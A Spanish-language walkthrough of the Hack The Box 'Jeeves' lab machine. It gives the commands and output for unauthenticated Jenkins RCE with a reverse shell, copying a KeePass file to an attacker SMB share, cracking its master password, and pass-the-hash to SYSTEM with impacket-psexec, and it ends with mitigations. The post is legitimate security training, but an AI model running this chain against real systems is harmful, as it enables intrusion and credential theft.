---
title: "HTB Walkthrough: Jeeves"
date: 2026-09-23
draft: false
description: "Walkthrough completo de la máquina Jeeves de Hack The Box. Dificultad Media, Windows. Jenkins sin autenticación en puerto 50000 → RCE vía Freestyle Project → base de datos KeePass con hash NTLM → Pass-the-Hash como Administrator → flag oculta en un Alternate Data Stream (ADS) de NTFS."
tags: ["HackTheBox", "Windows", "Medium", "Jenkins", "RCE", "KeePass", "PassTheHash", "NTLM", "SMB", "ADS", "AlternateDataStream", "NTFS", "Impacket", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough de **Jeeves** en Hack The Box. Máquina de dificultad **Media** con **Windows**. Un escaneo de puertos revela un servidor Jetty en el puerto 50000 — fuzzing descubre una instancia de **Jenkins accesible sin autenticación**. Un *Freestyle Project* con un paso de Batch de Windows da RCE inmediato. En los documentos del usuario comprometido encontramos una base de datos **KeePass** (`CEH.kdbx`) que, tras crackear la contraseña maestra, contiene un **hash NTLM** de `Administrator` guardado como nota. **Pass-the-Hash** con `impacket-psexec` da shell como `NT AUTHORITY\SYSTEM`. La root flag está oculta en un **Alternate Data Stream (ADS)** de NTFS, invisible en un listado normal.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Windows{{< /badge >}}
{{< badge >}}Medium{{< /badge >}}

---

## 🗺️ Información de la Máquina

| Campo          | Detalle                                                                                                                                   |
|----------------|-------------------------------------------------------------------------------------------------------------------------------------------|
| **Nombre**     | Jeeves                                                                                                                                    |
| **SO**         | Windows                                                                                                                                   |
| **Dificultad** | Media                                                                                                                                     |
| **IP**         | 10.129.62.14                                                                                                                              |
| **Técnicas**   | Jenkins RCE sin auth · Exfiltración SMB · Cracking KeePass · Pass-the-Hash · Alternate Data Streams (NTFS ADS)                           |

---

## 1. Reconocimiento

### 1.1 Escaneo de Puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.62.14
```

```
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2
```

### 1.2 Detección de Servicio en el Puerto 50000

```bash
nmap -sC -sV -p50000 10.129.62.14
```

```
PORT      STATE SERVICE VERSION
50000/tcp open  http    Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
```

> **💡 Superficie de ataque:** Nmap etiqueta el puerto 50000 como `ibm-db2` por convención de puerto, pero en realidad es un servidor **Jetty** — contenedor de aplicaciones Java habitualmente usado para servir **Jenkins**. La raíz (`/`) responde 404, así que hace falta descubrir la ruta real con fuzzing.

---

## 2. Enumeración Web — Descubrimiento de Jenkins

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt \
  -u http://10.129.62.14:50000/FUZZ
```

```
askjeeves    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 46ms]
```

Al visitar `http://10.129.62.14:50000/askjeeves` se redirige a una instancia de **Jenkins accesible sin autenticación**.

![Dashboard de Jenkins en /askjeeves sin requerir login](/img/jeeves1.png)

> **⚠️ Exposición crítica:** Jenkins está completamente abierto — cualquier visitante anónimo puede crear y ejecutar *jobs* de compilación, lo que es equivalente a ejecución de comandos en el servidor.

---

## 3. Explotación — RCE en Jenkins vía *Freestyle Project*

Jenkins sin restricciones de acceso permite crear y ejecutar *jobs* libremente — lo que se traduce directamente en **ejecución de comandos en el sistema operativo** del servidor Jenkins.

### 3.1 Crear un Nuevo Ítem de Tipo *Freestyle Project*

Navegamos a `New Item`, introducimos un nombre (p.ej. `test`) y seleccionamos **Freestyle project**.

![Creación de nuevo item tipo Freestyle project en Jenkins](/img/jeeves2.png)

### 3.2 Configurar el Paso de Compilación con la Reverse Shell

En la configuración del *job*, dentro de la sección **Build**, añadimos un paso de tipo **Execute Windows batch command** con un one-liner de PowerShell que abre una conexión TCP inversa a nuestra máquina.

![Build step con payload de reverse shell en PowerShell codificado en Base64](/img/jeeves3.png)

```
Normal flow:    job legítimo → ejecuta comandos de compilación en el workspace
Flujo malicioso: job malicioso → Execute Windows batch → powershell reverse shell
                 → conexión saliente a nuestra máquina → shell como el usuario del servicio Jenkins
```

### 3.3 Guardar, Lanzar y Recibir la Shell

Guardamos la configuración y pulsamos **Build Now**. Con un listener activo:

```bash
nc -lvnp 4444
```

```
Listening on 0.0.0.0 4444
Connection received on 10.129.62.14 49676

PS C:\Users\Administrator\.jenkins\workspace\test> whoami
jeeves\kohsuke
```

> **💡 Por qué funciona:** cualquier *job* de Jenkins se ejecuta con los privilegios de la cuenta bajo la que corre el servicio — en este caso `kohsuke`. Sin autenticación para crear o lanzar *jobs*, cualquier visitante anónimo obtiene ejecución de código arbitraria en el servidor.

---

## 4. User Flag

```powershell
type C:\Users\kohsuke\Desktop\user.txt
```

> 🔑 User flag obtenida.

---

## 5. Enumeración Post-Explotación — Base de Datos KeePass

```powershell
cd C:\Users\kohsuke\Documents
dir
```

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        9/18/2017   1:43 PM          2846 CEH.kdbx
```

> **💡 Hallazgo clave:** una base de datos de **KeePass** (`CEH.kdbx`) en los documentos de `kohsuke`. Las bases KeePass están cifradas con una contraseña maestra — si es débil, puede crackearse offline. Su contenido puede incluir credenciales de alto valor.

---

## 6. Exfiltración del Fichero vía SMB

Levantamos un servidor SMB en nuestra máquina para recibir el fichero sin necesidad de transferencia por HTTP:

```bash
impacket-smbserver Folder $(pwd)
```

```
[*] Incoming connection (10.129.62.14,49677)
[*] User JEEVES\kohsuke authenticated successfully
```

Desde la shell de la víctima, montamos el recurso y copiamos el fichero:

```powershell
net use s: \\10.10.15.193\Folder
copy CEH.kdbx s:
```

```bash
ls $(pwd)/
# CEH.kdbx
```

---

## 7. Cracking de KeePass — Hallazgo del Hash NTLM

### 7.1 Extraer el Hash de la Base y Crackearlo

```bash
keepass2john CEH.kdbx > CEHhash
john CEHhash -w:/usr/share/wordlists/rockyou.txt
```

```
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
moonshine1       (CEH)
1g 0:00:01:10 DONE
```

> **🔑 Contraseña maestra obtenida:** `moonshine1`

### 7.2 Hash NTLM en la Entrada "Backup stuff"

Abrimos `CEH.kdbx` con KeePassXC e introducimos la contraseña maestra. Dentro, la entrada **"Backup stuff"** contiene un hash NTLM guardado como contraseña:

![KeePassXC con la entrada Backup stuff mostrando el hash NTLM de Administrator](/img/jeeves4.png)

```
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

> **💡 Hallazgo clave:** el propietario guardó el hash NTLM de `Administrator` como "copia de seguridad" dentro de la base. Con un hash NTLM no es necesaria la contraseña en claro — podemos autenticarnos directamente con **Pass-the-Hash**.

---

## 8. Pass-the-Hash como `Administrator`

```bash
impacket-psexec Administrator@10.129.62.14 \
  -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```

```
[*] Found writable share ADMIN$
[*] Uploading file VaCXAScN.exe
[*] Creating service niVe on 10.129.62.14.....
[*] Starting service niVe.....

C:\Windows\system32> whoami
nt authority\system
```

```
Flujo normal:    autenticación SMB con contraseña en claro
Flujo malicioso: autenticación SMB con hash NTLM directamente (sin descifrar)
                 → psexec sube ejecutable a ADMIN$ → lo registra como servicio
                 → shell como NT AUTHORITY\SYSTEM
```

> **✅ Pass-the-Hash exitoso:** `impacket-psexec` usa el hash NTLM para autenticarse por SMB sin necesidad de la contraseña en texto claro.

---

## 9. La Root Flag "Desaparecida" — Alternate Data Streams

```powershell
cd C:\Users\Administrator\Desktop
dir
```

```
12/24/2017  03:51 AM    36 hm.txt
11/08/2017  10:05 AM   797 Windows 10 Update Assistant.lnk
```

```powershell
type hm.txt
```

```
The flag is elsewhere.  Look deeper.
```

> **💡 Pista deliberada:** el contenido del fichero nos indica que la flag no está en el flujo de datos principal. En NTFS, un fichero puede tener **flujos de datos alternativos (ADS)** — invisibles en un `dir` normal, pero revelados con el modificador `/r`.

```powershell
dir /r
```

```
12/24/2017  03:51 AM    36 hm.txt
                        34 hm.txt:root.txt:$DATA
```

`hm.txt` tiene un flujo alternativo llamado `root.txt`. Lo leemos directamente:

```powershell
more < hm.txt:root.txt
```

---

## 10. Root Flag

```powershell
more < hm.txt:root.txt
```

> 🏁 Root flag obtenida.

---

## 11. Resumen y Lecciones Aprendidas

**Cadena de compromiso:**

1. **Reconocimiento** → Nmap revela el puerto 50000 (Jetty). Fuzzing descubre `/askjeeves` → Jenkins sin autenticación.
2. **RCE en Jenkins** → Freestyle Project + Execute Windows batch command → reverse shell como `jeeves\kohsuke`.
3. **User flag** → `C:\Users\kohsuke\Desktop\user.txt`.
4. **KeePass** → `CEH.kdbx` en los documentos de `kohsuke` → exfiltración vía `impacket-smbserver` + `net use`.
5. **Cracking** → `keepass2john` + `john` + `rockyou.txt` → contraseña maestra `moonshine1` → entrada "Backup stuff" contiene hash NTLM de Administrator.
6. **Pass-the-Hash** → `impacket-psexec` con el hash → shell como `NT AUTHORITY\SYSTEM`.
7. **ADS** → `hm.txt` tiene un flujo alternativo `root.txt` → `more < hm.txt:root.txt` → root flag.

**Qué aprendí de esta máquina:**

- **Jenkins sin autenticación es RCE inmediato.** No hace falta ningún CVE ni bypass — la funcionalidad legítima de crear y ejecutar *jobs* es directamente ejecución de comandos. La protección mínima es habilitar la autenticación en el primer arranque; Jenkins lo pregunta por defecto si se instala correctamente.

- **Los ficheros internos de las aplicaciones pueden contener credenciales de valor inesperado.** La base de datos KeePass de `kohsuke` no solo tenía contraseñas de servicios — tenía el hash NTLM del administrador de la máquina guardado como "backup". El radio de impacto de comprometer una cuenta de usuario nunca es solo esa cuenta.

- **Pass-the-Hash sigue siendo efectivo cuando NTLM está habilitado.** No hace falta crackear el hash a texto claro — el hash NTLM ES la credencial en el protocolo SMB/NTLM. La defensa requiere deshabilitar NTLM (o restringirlo) y aplicar Credential Guard; una contraseña compleja no ayuda si el hash puede usarse directamente.

- **Los Alternate Data Streams son una técnica real de ocultación en NTFS.** Un ADS no aparece en `dir`, no modifica el tamaño visible del fichero y pasa desapercibido en la mayoría de las herramientas de listado de archivos. HTB lo usa aquí como puzzle, pero en entornos reales los ADS son un vector legítimo de persistencia y exfiltración de malware — `dir /r` y herramientas como `streams.exe` (Sysinternals) deben ser parte de cualquier análisis forense en sistemas Windows.

- **La contraseña maestra de KeePass es el único punto de fallo de toda la base.** `moonshine1` está en `rockyou.txt` — la contraseña más obvia de un diccionario básico. Una contraseña maestra débil elimina toda la protección del gestor. Las contraseñas maestras deben ser largas, aleatorias y complementadas con un keyfile si el riesgo lo justifica.

**Mitigaciones:**

| Vector | Mitigación |
|--------|------------|
| Jenkins sin autenticación | Habilitar la seguridad global desde el primer arranque; nunca exponer la consola sin control de acceso |
| RCE vía Freestyle Project | Restringir quién puede crear/configurar *jobs*; usar agentes aislados; no ejecutar builds en el controlador |
| Contraseña maestra débil (`moonshine1`) | Contraseña maestra larga y aleatoria; complementar con keyfile para bases sensibles |
| Hash NTLM guardado como nota en KeePass | No almacenar hashes ni credenciales de otras cuentas como notas; minimizar el radio de impacto de una base comprometida |
| Pass-the-Hash con hash NTLM de Administrator | Deshabilitar NTLM donde sea posible; aplicar Credential Guard; restringir cuentas locales administrativas idénticas entre máquinas |
| Alternate Data Streams como ocultación | Monitorizar creación de ADS en filesystems NTFS; incluir `dir /r` y `streams.exe` en procedimientos forenses |
| Servicio Jenkins ejecutándose con cuenta con excesivos privilegios | Principio de mínimo privilegio: el servicio Jenkins no debe usar una cuenta cuyo compromiso facilite la escalada a Administrator |
